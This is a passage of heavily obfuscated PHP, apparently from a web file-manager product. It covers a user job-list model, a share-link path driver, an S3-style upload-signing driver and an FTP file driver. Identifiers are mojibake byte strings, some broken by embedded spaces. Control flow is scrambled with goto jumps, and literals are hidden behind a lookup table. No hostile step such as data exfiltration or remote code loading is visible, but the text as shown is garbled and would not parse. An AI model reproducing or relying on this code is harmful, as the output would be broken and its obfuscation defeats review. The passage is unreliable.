E‚‰‹ŒÂ¥: $fšÊŠİÈ è =& $_SERVER[İë¬“ÅÒÛ›]; $d”ÚºÀ†‚¨ = array($fšÊŠİÈ è[1086] => USER_ID, $fšÊŠİÈ è[1910] => 0); $bÙŞœÊå“Ğ = $this->where($d”ÚºÀ†‚¨)->where(array($fšÊŠİÈ è[28] => $Aˆ¬È¿í•Ä))->find(); goto e¤ÃÍ´ø©; dåƒ¾âó¨È: return $this->resetSort($d²ÌéõÔò—); goto f‡„å—ÇµĞ; e¤ÃÍ´ø©: if (!$bÙŞœÊå“Ğ) { return; } $d²ÌéõÔò— = $this->field($fšÊŠİÈ è[369])->where($d”ÚºÀ†‚¨)->order($fšÊŠİÈ è[1912])->select(); $d²ÌéõÔò— = array_to_keyvalue($d²ÌéõÔò—, $fšÊŠİÈ è[33], $fšÊŠİÈ è[369]); goto AØŞãæ…Á; AØŞãæ…Á: $a¤¼Õƒ³¡ = $d²ÌéõÔò—; $d²ÌéõÔò— = array_remove_value($d²ÌéõÔò—, $bÙŞœÊå“Ğ[$fšÊŠİÈ è[369]]); array_unshift($d²ÌéõÔò—, $bÙŞœÊå“Ğ[$fšÊŠİÈ è[369]]); goto dåƒ¾âó¨È; f‡„å—ÇµĞ: } protected function moveBottom($eò‚¤²¯å) { $DÊƒ‹æ“Ÿ¹ =& $_SERVER[İë¬“ÅÒÛ›]; $F¢ñèÖ§• = array($DÊƒ‹æ“Ÿ¹[1086] => USER_ID, $DÊƒ‹æ“Ÿ¹[1910] => 0); $Cæ’¼Úµ‚ó = $this->where($F¢ñèÖ§•)->max($DÊƒ‹æ“Ÿ¹[1567]); $eáÔ³¼“¿ = array($DÊƒ‹æ“Ÿ¹[1567] => $Cæ’¼Úµ‚ó + 1); return $this->where($F¢ñèÖ§•)->where(array($DÊƒ‹æ“Ÿ¹[28] => $eò‚¤²¯å))->save($eáÔ³¼“¿); } private function getAutoName($c‘ÊÈîÇõÓ) { goto CÏ“Œ‡ÉÓ†; E³ŠÁ‚‰¨µ: return $c‘ÊÈîÇõÓ . "\50{$EÈòÉ•ê¤Ù}\51"; goto cÒ¯§Ì« ; CÏ“Œ‡ÉÓ†: $DŸÀğİ¾ãÇ =& $_SERVER[İë¬“ÅÒÛ›]; $A²´ì¦ˆÌ´ = array($DŸÀğİ¾ãÇ[1086] => USER_ID, $DŸÀğİ¾ãÇ[1910] => 0); $D…Ê¼íäåÜ = $this->field($DŸÀğİ¾ãÇ[28])->where($A²´ì¦ˆÌ´)->select(); goto Cç§©¦ƒ˜á; Cç§©¦ƒ˜á: $D…Ê¼íäåÜ = array_to_keyvalue($D…Ê¼íäåÜ, $DŸÀğİ¾ãÇ[33], $DŸÀğİ¾ãÇ[28]); if (!$D…Ê¼íäåÜ || !in_array($c‘ÊÈîÇõÓ, $D…Ê¼íäåÜ)) { return $c‘ÊÈîÇõÓ; } for ($EÈòÉ•ê¤Ù = 0; $EÈòÉ•ê¤Ù < count($D…Ê¼íäåÜ); $EÈòÉ•ê¤Ù++) { if (!in_array($c‘ÊÈîÇõÓ . "\x28{$EÈòÉ•ê¤Ù}\x29", $D…Ê¼íäåÜ)) { return $c‘ÊÈîÇõÓ . "\50{$EÈòÉ•ê¤Ù}\51"; } } goto E³ŠÁ‚‰¨µ; cÒ¯§Ì« : } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\56\x6a\157\x62\x4c\151\163\164"; public $field = array("\x6e\141\155\x65", "\x64\145\x73\x63", "\x73\x6f\162\164"); const JOB_KEY = "\163\145\154\x66\x4a\x6f\x62\x4c\x69\163\164"; public function listData($bª ¿ÉÅ = false, $d›Ã‚ÖîÀò = "\163\157\162\x74", $DËØŒ¾¤¹§ = false) { return parent::listData($bª ¿ÉÅ, $d›Ã‚ÖîÀò, $DËØŒ¾¤¹§); } public function remove($CëÜñèÒó±) { return parent::remove($CëÜñèÒó±); } public function add($F‹©ÃÖ”Ó¯) { $cœÒÇ½°Ÿ‰ =& $_SERVER[İë¬“ÅÒÛ›]; if ($this->findByName($F‹©ÃÖ”Ó¯[$cœÒÇ½°Ÿ‰[28]])) { return !1; } $F‹©ÃÖ”Ó¯[$cœÒÇ½°Ÿ‰[1567]] = $this->getSort(); return parent::insert($F‹©ÃÖ”Ó¯); } private function getSort() { $fö»¹÷´ö =& $_SERVER[İë¬“ÅÒÛ›]; $E­Ôß„Ğ„ = parent::listData(); $C‰ÇßòĞÖ = array_to_keyvalue($E­Ôß„Ğ„, $fö»¹÷´ö[33], $fö»¹÷´ö[1567]); return empty($C‰ÇßòĞÖ) ? 0 : max($C‰ÇßòĞÖ) + 1; } public function update($d˜‹Òœ¬± , $e²‹äÈìÏì) { $bÇ„Ã‹É«‰ =& $_SERVER[İë¬“ÅÒÛ›]; $f“éêİ©­¬ = parent::listData($d˜‹Òœ¬± ); $e³º‰ßšÊ = $this->findByName($e²‹äÈìÏì[$bÇ„Ã‹É«‰[28]]); if (!$f“éêİ©­¬ || $e³º‰ßšÊ && $e³º‰ßšÊ[$bÇ„Ã‹É«‰[369]] != $f“éêİ©­¬[$bÇ„Ã‹É«‰[369]]) { return !1; } return parent::update($d˜‹Òœ¬± , $e²‹äÈìÏì); } public function setUserJob($CÇäÂÌ²¬, $fğğ—´Ã‹æ) { goto EïÀè–ˆë§; EïÀè–ˆë§: $F„¦Œ”ğ· =& $_SERVER[İë¬“ÅÒÛ›]; if (!is_array($fğğ—´Ã‹æ)) { $fğğ—´Ã‹æ = array($fğğ—´Ã‹æ); } $f‰ÁíÚï¦ë = parent::listData(); goto EŒê«Éİî; a¶İ“‚÷­—: $dåêçù©Ò = rtrim($dåêçù©Ò, $F„¦Œ”ğ·[47]); Model($F„¦Œ”ğ·[1481])->metaSet($CÇäÂÌ²¬, self::JOB_KEY, $dåêçù©Ò); goto C¦ÀÇòÔ›å; EŒê«Éİî: $EÔÈ‡‰á‘ = array_to_keyvalue($f‰ÁíÚï¦ë, $F„¦Œ”ğ·[28]); $dåêçù©Ò = $F„¦Œ”ğ·[364]; foreach ($fğğ—´Ã‹æ as $dáõÊ°¤Ğ­) { if ($EÔÈ‡‰á‘[$dáõÊ°¤Ğ­]) { $dåêçù©Ò .= $EÔÈ‡‰á‘[$dáõÊ°¤Ğ­][$F„¦Œ”ğ·[369]] . $F„¦Œ”ğ·[47]; } else { $cö„æá«¡² = $this->add($dáõÊ°¤Ğ­); $dåêçù©Ò .= $cö„æá«¡² . $F„¦Œ”ğ·[47]; } } goto a¶İ“‚÷­—; C¦ÀÇòÔ›å: } public function getUserJob($eÍÓ„ÙÕ­Æ) { $e”ØôğØ®ó = Model($_SERVER[İë¬“ÅÒÛ›][1481])->metaGet($eÍÓ„ÙÕ­Æ); return $this->getUserJobInfo($e”ØôğØ®ó[self::JOB_KEY]); } public function getUserJobInfo($CÃ¬ŸùäĞ×) { goto eÚÔ‘Ç¿øÚ; Cœ‚Ç‡—: return $b±´È£Ô®; goto D‚½Æ…ïá¹; D µïÖóóÂ: $A×ùÛó‰¹ = array_remove_key($A×ùÛó‰¹, $a±À»ç¢ƒ˜[187]); $b±´È£Ô® = array(); foreach ($D•¡ƒô× as $aöØ²Ä¾Ì) { if (isset($A×ùÛó‰¹[$aöØ²Ä¾Ì])) { $b±´È£Ô®[] = $A×ùÛó‰¹[$aöØ²Ä¾Ì]; } } goto Cœ‚Ç‡—; eÚÔ‘Ç¿øÚ: $a±À»ç¢ƒ˜ =& $_SERVER[İë¬“ÅÒÛ›]; $D•¡ƒô× = explode($a±À»ç¢ƒ˜[47], $CÃ¬ŸùäĞ×); $A×ùÛó‰¹ = parent::listData(); goto D µïÖóóÂ; D‚½Æ…ïá¹: } } goto eƒ›õƒµ»é; D¤¤°àè¨Ò: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($bÓïã˜îÒŸ) { $this->pathParse = $bÓïã˜îÒŸ; } protected function infoParse($eºœËç‘”Ê) { $f¬È™•õŠ† =& $_SERVER[İë¬“ÅÒÛ›]; return Action($f¬È™•õŠ†[766])->sharePathInfo($this->pathParse[$f¬È™•õŠ†[76]], !0); } public function listAll($E³æ÷‘Ô‚ì) { $Cïë¼¶ØÉ =& $_SERVER[İë¬“ÅÒÛ›]; $DÉÇÎâÙğğ = IO::listAll($E³æ÷‘Ô‚ì); foreach ($DÉÇÎâÙğğ as &$F³Ù¶•¨»¿) { check_abort(); $F³Ù¶•¨»¿ = array_merge(IO::info($F³Ù¶•¨»¿[$Cïë¼¶ØÉ[76]]), $F³Ù¶•¨»¿); $F³Ù¶•¨»¿[$Cïë¼¶ØÉ[861]] = Action($Cïë¼¶ØÉ[766])->itemInfo($F³Ù¶•¨»¿); $F–×™ãö÷Á = substr($F³Ù¶•¨»¿[$Cïë¼¶ØÉ[76]], strpos(ltrim($F³Ù¶•¨»¿[$Cïë¼¶ØÉ[76]], $Cïë¼¶ØÉ[8]), $Cïë¼¶ØÉ[8]) + 1); $F³Ù¶•¨»¿[$Cïë¼¶ØÉ[861]][$Cïë¼¶ØÉ[76]] = $this->pathParse[$Cïë¼¶ØÉ[761]] . $F–×™ãö÷Á; } return $DÉÇÎâÙğğ; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($bÓ¬‡ƒ«ÅÚ) { parent::__construct($bÓ¬‡ƒ«ÅÚ); $this->signatureVersion($_SERVER[İë¬“ÅÒÛ›][200]); } public function uploadFormData($B‡æÔÖ²••, $a¢Ø›öØĞ— = 3600) { goto c÷À—­Ä; c÷À—­Ä: $e˜ÃÖ˜ˆŸ =& $_SERVER[İë¬“ÅÒÛ›]; $EÍÖÛñÕ¦¨ = $e˜ÃÖ˜ˆŸ[182]; $cÚôˆÜÌùí = $e˜ÃÖ˜ˆŸ[870]; goto Eéâ§øïè; dé„æœğ®Ü: $aƒ‘ÜµìªÌ = hash_hmac($e˜ÃÖ˜ˆŸ[880], $D‹÷ŞñÎ¯, $e›ïĞ‚ÛÏ“, !0); $c¯Åòìõ…© = hash_hmac($e˜ÃÖ˜ˆŸ[880], $bÍÏ÷óóéŒ, $aƒ‘ÜµìªÌ, !0); $DÜøõ¤¦‡ä = hash_hmac($e˜ÃÖ˜ˆŸ[880], $e®–Æ–¨†Å, $c¯Åòìõ…©); goto B´îÓ»¹é; B´îÓ»¹é: $F…—ºíâïù = array($e˜ÃÖ˜ˆŸ[199] => $e˜ÃÖ˜ˆŸ[33], $e˜ÃÖ˜ˆŸ[882] => $e˜ÃÖ˜ˆŸ[33], $e˜ÃÖ˜ˆŸ[844] => $EÍÖÛñÕ¦¨, $e˜ÃÖ˜ˆŸ[848] => $aôÛ¾ŠÇ, $e˜ÃÖ˜ˆŸ[852] => $e®–Æ–¨†Å, $e˜ÃÖ˜ˆŸ[883] => $CØÎ‚ èï, $e˜ÃÖ˜ˆŸ[884] => $cÚôˆÜÌùí, $e˜ÃÖ˜ˆŸ[885] => $Bƒ¾ÙéÛßÕ, $e˜ÃÖ˜ˆŸ[886] => $FÁ¿ñÅ, $e˜ÃÖ˜ˆŸ[887] => $DÜøõ¤¦‡ä, $e˜ÃÖ˜ˆŸ[166] => $this->getHost()); return $F…—ºíâïù; goto Fİ‘êÇß™; fôÓ¾¶Œê‰: $e®–Æ–¨†Å = base64_encode(json_encode($EŞ‘ÕÆí™Ø)); $e¨«Å÷ˆŞ¨ = hash_hmac($e˜ÃÖ˜ˆŸ[880], $CÁŒ£¬Åˆµ, $e˜ÃÖ˜ˆŸ[881] . $this->secret, !0); $e›ïĞ‚ÛÏ“ = hash_hmac($e˜ÃÖ˜ˆŸ[880], $this->region, $e¨«Å÷ˆŞ¨, !0); goto dé„æœğ®Ü; eì“éä¦é: $dˆÙøÀ…” = array($this->accessKey, $CÁŒ£¬Åˆµ, $this->region, $D‹÷ŞñÎ¯, $bÍÏ÷óóéŒ); $CØÎ‚ èï = implode($e˜ÃÖ˜ˆŸ[8], $dˆÙøÀ…”); $EŞ‘ÕÆí™Ø = array($e˜ÃÖ˜ˆŸ[842] => gmdate($e˜ÃÖ˜ˆŸ[841], strtotime($e˜ÃÖ˜ˆŸ[873])), $e˜ÃÖ˜ˆŸ[843] => array(array($e˜ÃÖ˜ˆŸ[845] => $this->bucket), array($e˜ÃÖ˜ˆŸ[844] => $EÍÖÛñÕ¦¨), array($e˜ÃÖ˜ˆŸ[846], $e˜ÃÖ˜ˆŸ[847], $e˜ÃÖ˜ˆŸ[33]), array($e˜ÃÖ˜ˆŸ[846], $e˜ÃÖ˜ˆŸ[874], $e˜ÃÖ˜ˆŸ[33]), array($e˜ÃÖ˜ˆŸ[846], $e˜ÃÖ˜ˆŸ[875], $e˜ÃÖ˜ˆŸ[33]), array($e˜ÃÖ˜ˆŸ[848] => $aôÛ¾ŠÇ), array($e˜ÃÖ˜ˆŸ[876] => $CØÎ‚ èï), array($e˜ÃÖ˜ˆŸ[877] => $cÚôˆÜÌùí), array($e˜ÃÖ˜ˆŸ[878] => $Bƒ¾ÙéÛßÕ), array($e˜ÃÖ˜ˆŸ[879] => $FÁ¿ñÅ))); goto fôÓ¾¶Œê‰; Eéâ§øïè: $D‹÷ŞñÎ¯ = $e˜ÃÖ˜ˆŸ[59]; $Bƒ¾ÙéÛßÕ = gmdate($e˜ÃÖ˜ˆŸ[871]); $CÁŒ£¬Åˆµ = gmdate($e˜ÃÖ˜ˆŸ[448]); goto D³İµÕóÅ; D³İµÕóÅ: $bÍÏ÷óóéŒ = $e˜ÃÖ˜ˆŸ[872]; $FÁ¿ñÅ = $a¢Ø›öØĞ— . $e˜ÃÖ˜ˆŸ[33]; $aôÛ¾ŠÇ = $e˜ÃÖ˜ˆŸ[840]; goto eì“éä¦é; Fİ‘êÇß™: } public function fileOutLink($CÆÁ«èØ–ˆ) { header($_SERVER[İë¬“ÅÒÛ›][153] . $CÆÁ«èØ–ˆ); die; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($D°¸ÙŸò¥‹) { parent::__construct(); if (count($D°¸ÙŸò¥‹) > 0) { $this->_init($D°¸ÙŸò¥‹); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($bÌ„–²¬éá) { $F¤¬´¿ôï¸ =& $_SERVER[İë¬“ÅÒÛ›]; global $config; $this->appCharset = $config[$F¤¬´¿ôï¸[888]]; $this->systemCharset = $config[$F¤¬´¿ôï¸[889]]; if (isset($bÌ„–²¬éá[$F¤¬´¿ôï¸[890]]) && $bÌ„–²¬éá[$F¤¬´¿ôï¸[890]]) { $this->systemCharset = $bÌ„–²¬éá[$F¤¬´¿ôï¸[890]]; } } public function iconvApp($aØ‘Šµ…µ¡) { return $this->iconvTo($aØ‘Šµ…µ¡, $this->systemCharset, $this->appCharset); } public function iconvSystem($føİ“É»²ß) { return $this->iconvTo($føİ“É»²ß, $this->appCharset, $this->systemCharset); } public function getPathOuter($C¥‘¶ŠÖ¤Ú) { goto Cİ²·Çí¯Ñ; Cİ²·Çí¯Ñ: $Cá›µÖƒÍ– =& $_SERVER[İë¬“ÅÒÛ›]; $C™ƒèï¿” = $this->iconvApp($this->pathBase); $C¥‘¶ŠÖ¤Ú = $this->iconvApp($C¥‘¶ŠÖ¤Ú); goto E¢×¾’‘; Eå¦‘¿÷‚æ: $C¥‘¶ŠÖ¤Ú = KodIO::clear($C¥‘¶ŠÖ¤Ú); $C¥‘¶ŠÖ¤Ú = substr($C¥‘¶ŠÖ¤Ú, strlen($C™ƒèï¿”)); if (empty($this->pathDriver)) { return $C¥‘¶ŠÖ¤Ú; } goto eÙËéâëÇ“; eÙËéâëÇ“: return $this->pathDriver . $Cá›µÖƒÍ–[8] . ltrim($C¥‘¶ŠÖ¤Ú, $Cá›µÖƒÍ–[8]); goto f‹É¡¬Á•æ; E¢×¾’‘: if (substr($C™ƒèï¿”, 0, 2) == $Cá›µÖƒÍ–[891]) { $C™ƒèï¿” = BASIC_PATH . substr($C™ƒèï¿”, 2); } if (substr($C¥‘¶ŠÖ¤Ú, 0, 2) == $Cá›µÖƒÍ–[891]) { $C¥‘¶ŠÖ¤Ú = BASIC_PATH . substr($C¥‘¶ŠÖ¤Ú, 2); } $C™ƒèï¿” = KodIO::clear($C™ƒèï¿”); goto Eå¦‘¿÷‚æ; f‹É¡¬Á•æ: } private function _init($eÏŠÑĞáÖê = array()) { goto c†ÌÉØÁ½‰; e§ÓÖ³êõÌ: $E³õ†Ñ¸Ñ = isset($bİ— ©›Ãœ[$e¡ÀÓá´›®[165]]) && $bİ— ©›Ãœ[$e¡ÀÓá´›®[165]] == $e¡ÀÓá´›®[894] ? !0 : !1; $this->scheme = $E³õ†Ñ¸Ñ ? $e¡ÀÓá´›®[895] : $e¡ÀÓá´›®[896]; $this->port = isset($bİ— ©›Ãœ[$e¡ÀÓá´›®[167]]) ? $bİ— ©›Ãœ[$e¡ÀÓá´›®[167]] : 21; goto E¬¥ŒËçªÒ; E¬¥ŒËçªÒ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $c±¶ÓÏÅÉÍ = @ftp_login($this->connect, $this->username, $this->userpass); goto Böª–ãîİÙ; c†ÌÉØÁ½‰: $e¡ÀÓá´›® =& $_SERVER[İë¬“ÅÒÛ›]; if (!function_exists($e¡ÀÓá´›®[892])) { show_json(LNG($e¡ÀÓá´›®[893]), !1); } $this->charsetReset($eÏŠÑĞáÖê); goto eæÇ³´ˆİ; eæÇ³´ˆİ: foreach ($eÏŠÑĞáÖê as $C¢ÄÓˆğĞÃ => $aÊõÌ¯Á‰) { if (isset($this->{$C¢ÄÓˆğĞÃ})) { $this->{$C¢ÄÓˆğĞÃ} = $aÊõÌ¯Á‰; } } $bİ— ©›Ãœ = parse_url(trim($this->server, $e¡ÀÓá´›®[8])); $this->host = $bİ— ©›Ãœ[$e¡ÀÓá´›®[166]]; goto e§ÓÖ³êõÌ; Böª–ãîİÙ: @ftp_pasv($this->connect, !0); return $c±¶ÓÏÅÉÍ; goto F¾ØÈ »–‹; F¾ØÈ »–‹: } private function _isconn() { return is_resource($this->connect); } public function mkfile($E£İ­»ÃÒó, $A«§°¡Èñ = '', $Aí±ë˜î± = REPEAT_RENAME) { if ($this->setContent($E£İ­»ÃÒó, $A«§°¡Èñ)) { return $this->getPathOuter($E£İ­»ÃÒó); } return !1; } public function mkdir($Aâö÷°º‰³, $DŒ‰×º¥ÛØ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Aâö÷°º‰³ = $this->iconvSystem($Aâö÷°º‰³); if ($this->_isFolder($Aâö÷°º‰³) || @ftp_mkdir($this->connect, $Aâö÷°º‰³)) { return $this->getPathOuter($Aâö÷°º‰³); } if (!$this->mkdir($this->pathFather($Aâö÷°º‰³))) { return !1; } if ($Aâö÷°º‰³ = @ftp_mkdir($this->connect, $Aâö÷°º‰³)) { return $this->getPathOuter($Aâö÷°º‰³); } return !1; } public function copyFile($AÛ¹ÁÁìâ“, $A×¢Ğ´³Ğ²) { goto E›¢´¼Æª²; e‚ªÂ½Ç†„: $D‰àçÈŞ÷Ÿ = $this->iconvApp($dµ½ÛƒÛ¥«); $this->download($AÛ¹ÁÁìâ“, $D‰àçÈŞ÷Ÿ); $fÙÆáôÚÌä = $this->upload($A×¢Ğ´³Ğ², $D‰àçÈŞ÷Ÿ); goto d›³¤‰©; d›³¤‰©: $this->tempFileRemve($dµ½ÛƒÛ¥«); return $fÙÆáôÚÌä; goto A‚˜¯ã†±ß; E›¢´¼Æª²: if (!$this->_isconn()) { return !1; } $B¶ƒ‘‚÷âÖ = $this->pathThis($this->iconvSystem($AÛ¹ÁÁìâ“)); $dµ½ÛƒÛ¥« = $this->tempFile($B¶ƒ‘‚÷âÖ); goto e‚ªÂ½Ç†„; A‚˜¯ã†±ß: } public function moveFile($F¡’¯ˆ ­, $DÌ´ÅŸŠÊ…) { if (!$this->_isconn()) { return !1; } $F¡’¯ˆ ­ = $this->iconvSystem($F¡’¯ˆ ­); $DÌ´ÅŸŠÊ… = $this->iconvSystem($DÌ´ÅŸŠÊ…); $e–éÆéÔø = @ftp_rename($this->connect, $F¡’¯ˆ ­, $DÌ´ÅŸŠÊ…); return $e–éÆéÔø ? $this->getPathOuter($DÌ´ÅŸŠÊ…) : !1; } public function delFile($dÛŠ†ìõ‹®) { if (!$this->_isconn()) { return !1; } $dÛŠ†ìõ‹® = $this->iconvSystem($dÛŠ†ìõ‹®); return @ftp_delete($this->connect, $dÛŠ†ìõ‹®); } public function delFolder($e„Ù‹˜’Ó‡) { if (!$this->_isconn()) { return !1; } $e„Ù‹˜’Ó‡ = $this->iconvSystem($e„Ù‹˜’Ó‡); $Cé¢ßÕ— = $this->ftpList($e„Ù‹˜’Ó‡); if (!$Cé¢ßÕ—) { return @ftp_rmdir($this->connect, $e„Ù‹˜’Ó‡); } foreach ($Cé¢ßÕ— as $CêÍêÉîí¨) { if ($this->_isFolder($CêÍêÉîí¨)) { $CêÍêÉîí¨ = $this->iconvApp($CêÍêÉîí¨); $this->delFolder($CêÍêÉîí¨); } else { @ftp_delete($this->connect, $CêÍêÉîí¨); } } return @ftp_rmdir($this->connect, $e„Ù‹˜’Ó‡); } public function rename($Fâîê„Á¸, $a°ŒˆÂ©ÌŒ) { goto eîÔ°äèøé; BèŠï¬ÆÑ: $fÓ„’Ò‹»… = rtrim($D´ì½êÎÀ, $AÁĞ½ÈîÌç[8]) . $AÁĞ½ÈîÌç[8] . $c±îÉŞî©°; $cİ˜ÏÒ¿Á§ = @ftp_rename($this->connect, $Fâîê„Á¸, $fÓ„’Ò‹»…); $fÓ„’Ò‹»… = $this->iconvApp($fÓ„’Ò‹»…); goto e‡Çáì‡Âò; e‡Çáì‡Âò: return $cİ˜ÏÒ¿Á§ ? $this->getPathOuter($fÓ„’Ò‹»…) : !1; goto C¸‘Íğ•ë; f½§äà£µ: $c±îÉŞî©° = $this->iconvSystem($c±îÉŞî©°); $Fâîê„Á¸ = $this->iconvSystem($Fâîê„Á¸); $D´ì½êÎÀ = $this->pathFather($Fâîê„Á¸); goto BèŠï¬ÆÑ; eîÔ°äèøé: $AÁĞ½ÈîÌç =& $_SERVER[İë¬“ÅÒÛ›]; if (!$this->_isconn()) { return !1; } $c±îÉŞî©° = $this->fileNameAuto($this->pathFather($Fâîê„Á¸), $a°ŒˆÂ©ÌŒ); goto f½§äà£µ; C¸‘Íğ•ë: } public function _size($Cäİ†¥÷Ë) { if (!$this->_isconn()) { return !1; } $Cäİ†¥÷Ë = $this->iconvSystem($Cäİ†¥÷Ë); return @ftp_size($this->connect, $Cäİ†¥÷Ë); } public function _info($Bé¿©ˆÙò) { if (!$this->_isconn()) { return !1; } $Bé¿©ˆÙò = $this->iconvSystem($Bé¿©ˆÙò); if ($this->_isFile($Bé¿©ˆÙò)) { return $this->fileInfo($Bé¿©ˆÙò, 1); } else { if ($this->_isFolder($Bé¿©ˆÙò)) { return $this->folderInfo($Bé¿©ˆÙò); } } return !1; } private function folderInfo($a¿ğ»ìçç®, $eèØñ“ß‘£ = false) { $d‹ƒ÷Ğ‹ø¥ =& $_SERVER[İë¬“ÅÒÛ›]; $c¥Ü­óéŠÆ = $this->iconvApp($this->pathThis($a¿ğ»ìçç®)); if ($eèØñ“ß‘£) { return array($d‹ƒ÷Ğ‹ø¥[28] => $c¥Ü­óéŠÆ, $d‹ƒ÷Ğ‹ø¥[76] => $this->getPathOuter($a¿ğ»ìçç®), $d‹ƒ÷Ğ‹ø¥[29] => $d‹ƒ÷Ğ‹ø¥[77]); } $cñºÊ¬ªÆ‡ = array($d‹ƒ÷Ğ‹ø¥[28] => $c¥Ü­óéŠÆ, $d‹ƒ÷Ğ‹ø¥[76] => $this->getPathOuter($a¿ğ»ìçç®), $d‹ƒ÷Ğ‹ø¥[29] => $d‹ƒ÷Ğ‹ø¥[77], $d‹ƒ÷Ğ‹ø¥[187] => $d‹ƒ÷Ğ‹ø¥[50], $d‹ƒ÷Ğ‹ø¥[106] => $d‹ƒ÷Ğ‹ø¥[50], $d‹ƒ÷Ğ‹ø¥[897] => !0, $d‹ƒ÷Ğ‹ø¥[898] => !0); return $cñºÊ¬ªÆ‡; } private function fileInfo($f³®Å ”¨·, $C†·¡ª´š = false) { $bùÒŒ•½ø‹ =& $_SERVER[İë¬“ÅÒÛ›]; $f³®Å ”¨· = rtrim($f³®Å ”¨·, $bùÒŒ•½ø‹[8]); $d¾ëêÜ•Ú = $this->iconvApp($this->pathThis($f³®Å ”¨·)); if ($C†·¡ª´š) { return array($bùÒŒ•½ø‹[28] => $d¾ëêÜ•Ú, $bùÒŒ•½ø‹[76] => $this->getPathOuter($f³®Å ”¨·), $bùÒŒ•½ø‹[29] => $bùÒŒ•½ø‹[164], $bùÒŒ•½ø‹[157] => $this->ext($f³®Å ”¨·), $bùÒŒ•½ø‹[78] => $this->size($f³®Å ”¨·)); } $cç‡ìæëİ˜ = array($bùÒŒ•½ø‹[28] => $d¾ëêÜ•Ú, $bùÒŒ•½ø‹[76] => $this->getPathOuter($f³®Å ”¨·), $bùÒŒ•½ø‹[29] => $bùÒŒ•½ø‹[164], $bùÒŒ•½ø‹[187] => $bùÒŒ•½ø‹[50], $bùÒŒ•½ø‹[106] => @ftp_mdtm($this->connect, $f³®Å ”¨·), $bùÒŒ•½ø‹[157] => $this->ext($f³®Å ”¨·), $bùÒŒ•½ø‹[78] => $this->size($f³®Å ”¨·), $bùÒŒ•½ø‹[897] => !0, $bùÒŒ•½ø‹[898] => !0); return $cç‡ìæëİ˜; } public function exist($cáéŞÈ®•) { if (!$this->_isconn()) { return !1; } $cáéŞÈ®• = $this->iconvSystem($cáéŞÈ®•); if ($this->_size($cáéŞÈ®•) > -1) { return !0; } if ($this->_isFolder($cáéŞÈ®•)) { return !0; } return !1; } public function size($Bß¢×Î¨±) { return $this->cacheMehod($_SERVER[İë¬“ÅÒÛ›][899], $Bß¢×Î¨±); } public function info($cÀàŒ©‚—‹) { return $this->cacheMehod($_SERVER[İë¬“ÅÒÛ›][183], $cÀàŒ©‚—‹); } public function isFile($a¶ºİÊîÀç) { return $this->cacheMehod($_SERVER[İë¬“ÅÒÛ›][184], $a¶ºİÊîÀç); } public function isFolder($C°çÊ–ùÊ) { return $this->cacheMehod($_SERVER[İë¬“ÅÒÛ›][185], $C°çÊ–ùÊ); } public function _isFile($d‹¿ˆê²ğº) { $b¶–Úµöä’ =& $_SERVER[İë¬“ÅÒÛ›]; if ($d‹¿ˆê²ğº == $b¶–Úµöä’[8]) { return !1; } if (!$this->_isconn() || !$this->exist($d‹¿ˆê²ğº)) { return !1; } @ftp_chdir($this->connect, $b¶–Úµöä’[8]); $d‹¿ˆê²ğº = $this->iconvSystem($d‹¿ˆê²ğº); return !$this->_isFolder($d‹¿ˆê²ğº); } public function _isFolder($eø½®—ÙÄ) { if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $_SERVER[İë¬“ÅÒÛ›][8]); $eø½®—ÙÄ = $this->iconvSystem($eø½®—ÙÄ); return $this->chDir($eø½®—ÙÄ); } private function chDir($e®‹Æ—‹‡…) { return @ftp_chdir($this->connect, $e®‹Æ—‹‡…); } public function listPath($C†‡«ÈŸğ , $EÆ¡¯Ù¢õ‹ = false) { goto fÌÜÃÃ¯ñá; bõÌ•È‡¾Ø: $a±‚Ùİ„ó = $this->ftpList($C†‡«ÈŸğ ); $Cƒ¿£¥Õ° = array($BÒÉœ‡§æÅ[75] => array(), $BÒÉœ‡§æÅ[74] => array()); if (!$a±‚Ùİ„ó) { return $Cƒ¿£¥Õ°; } goto b¾‚‚­Õëó; fÌÜÃÃ¯ñá: $BÒÉœ‡§æÅ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$this->_isconn()) { return !1; } $C†‡«ÈŸğ  = $this->iconvSystem($C†‡«ÈŸğ ); goto bõÌ•È‡¾Ø; b¾‚‚­Õëó: foreach ($a±‚Ùİ„ó as $C†‡«ÈŸğ ) { if ($this->_isFolder($C†‡«ÈŸğ )) { $Cƒ¿£¥Õ°[$BÒÉœ‡§æÅ[75]][] = $this->folderInfo($C†‡«ÈŸğ , $EÆ¡¯Ù¢õ‹); } else { $Cƒ¿£¥Õ°[$BÒÉœ‡§æÅ[74]][] = $this->fileInfo($C†‡«ÈŸğ , $EÆ¡¯Ù¢õ‹); } } return $Cƒ¿£¥Õ°; goto e×åŸ¡Ø‚; e×åŸ¡Ø‚: } public function has($d‚î–È‡ì, $D¶İØƒŠã = false, $E³õ–“¾šÄ = true) { goto Bª–¯˜ò„Æ; cÑŸîŠŸ­: $D’íÑ ©ÏÃ = $this->ftpList($d‚î–È‡ì); if (!$D’íÑ ©ÏÃ) { return !1; } if ($D¶İØƒŠã) { return array($Aé™—ßºø®[191] => 0, $Aé™—ßºø®[192] => count($D’íÑ ©ÏÃ)); } goto c• ÖÚ¯Ó; c• ÖÚ¯Ó: foreach ($D’íÑ ©ÏÃ as $d‚î–È‡ì) { if ($E³õ–“¾šÄ) { if (!$this->_isFolder($d‚î–È‡ì)) { return !0; } } else { if ($this->_isFolder($d‚î–È‡ì)) { return !0; } } } return !1; goto DÏ¼ÑÈÃ‰–; Bª–¯˜ò„Æ: $Aé™—ßºø® =& $_SERVER[İë¬“ÅÒÛ›]; if (!$this->_isconn()) { return !1; } $d‚î–È‡ì = $this->iconvSystem($d‚î–È‡ì); goto cÑŸîŠŸ­; DÏ¼ÑÈÃ‰–: } public function listAll($e¶¬¶î¼†²) { goto d±—ù‘³«­; CĞ¤ìñ‡¥: $e£©Ş’·å­ = $this->recursionFtpFiles($e¶¬¶î¼†²); $c‰¹í…´ÀŸ = array(); foreach 